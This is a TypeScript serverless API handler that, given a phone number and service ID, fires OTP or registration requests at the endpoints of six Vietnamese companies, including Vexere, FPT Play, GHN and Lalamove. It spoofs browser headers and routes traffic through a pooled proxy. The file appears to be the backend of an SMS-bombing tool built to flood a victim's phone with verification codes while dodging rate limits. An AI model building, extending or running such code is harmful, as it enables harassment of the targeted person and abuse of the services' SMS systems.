
import type { VercelRequest, VercelResponse } from '@vercel/node';
import { HttpsProxyAgent } from 'https-proxy-agent';

export default async function handler(req: VercelRequest, res: VercelResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { serviceId, phone, proxyConfig } = req.body;
  
  if (!serviceId || !phone) {
    return res.status(400).json({ error: 'Missing parameters' });
  }

  const phoneClean = phone.replace(/\s+/g, '');
  const phoneWith84 = phoneClean.startsWith('0') ? '84' + phoneClean.substring(1) : phoneClean;

  // Cấu hình Proxy Agent nếu có thông tin từ pool
  let agent = null;
  if (proxyConfig && proxyConfig.host && proxyConfig.port) {
    const { host, port, user, pass } = proxyConfig;
    const proxyUrl = user && pass 
      ? `http://${user}:${pass}@${host}:${port}`
      : `http://${host}:${port}`;
    
    try {
      agent = new HttpsProxyAgent(proxyUrl);
    } catch (e) {
      console.error("Proxy Agent Init Error");
    }
  }

  try {
    let url = '';
    let fetchOptions: any = {
      method: 'POST',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Referer': 'https://www.google.com/',
      },
      ...(agent ? { agent } : {})
    };

    // Mapping dịch vụ
    switch (serviceId) {
      case 'vexere':
        url = 'https://api.vexere.com/v1/user/otp';
        fetchOptions.body = JSON.stringify({ phone: phoneClean, type: 'register' });
        break;
      case 'fptplay':
        url = 'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp';
        fetchOptions.headers['Origin'] = 'https://fptplay.vn';
        fetchOptions.body = JSON.stringify({ phone: phoneClean });
        break;
      case 'ghn':
        url = 'https://sso.ghn.vn/v2/otp/send';
        fetchOptions.body = JSON.stringify({ phone: phoneClean });
        break;
      case 'ahamove':
        url = 'https://app.ahamove.com/api/v1/user/otp';
        fetchOptions.body = JSON.stringify({ mobile: phoneWith84 });
        break;
      case 'lalamove':
        url = 'https://www.lalamove.com/api/v1/otp/send';
        fetchOptions.body = JSON.stringify({ phone: phoneWith84, country: 'VN' });
        break;
      case 'fptshop':
        url = 'https://fptshop.com.vn/api-fsh/customer/get-otp';
        fetchOptions.body = JSON.stringify({ phoneNumber: phoneClean, type: 1 });
        break;
      default:
        url = 'https://api.vexere.com/v1/user/otp';
        fetchOptions.body = JSON.stringify({ phone: phoneClean, type: 'register' });
    }

    const response = await fetch(url, fetchOptions as any);
    const status = response.status;

    return res.status(200).json({ 
      success: response.ok, 
      status: status,
      proxyUsed: !!agent,
      message: response.ok ? "Success" : `Failed (${status})`
    });

  } catch (error: any) {
    return res.status(500).json({ 
      success: false, 
      error: error.message,
      message: "Proxy connection timeout or refused"
    });
  }
}
